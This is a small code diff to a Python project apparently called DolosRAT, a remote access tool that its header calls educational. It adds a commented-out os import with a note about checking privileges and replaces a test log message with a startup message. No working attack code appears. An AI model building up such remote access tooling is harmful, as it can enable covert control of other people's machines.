@@ -13,7 +13,7 @@ the use of this tool is for educational purposes only.
 
 # Built-in/Generic Imports.
 import sys
-
+# import os # LATER: Check privileges.
 from typing import Any, Dict, Union
 
 # Modules.
@@ -108,7 +108,7 @@ class DolosRAT:
         With handles created for the classes pertinent
         to the application, use these to commence DolosRAT.
         """
-        self._logger.write_log("test", LoggerLevel.INFO)
+        self._logger.write_log("DolosRAT Initialised and Started.", LoggerLevel.INFO)
 
     def start(self: object) -> None:
         """Exposed method for 'starting' DolosRAT.
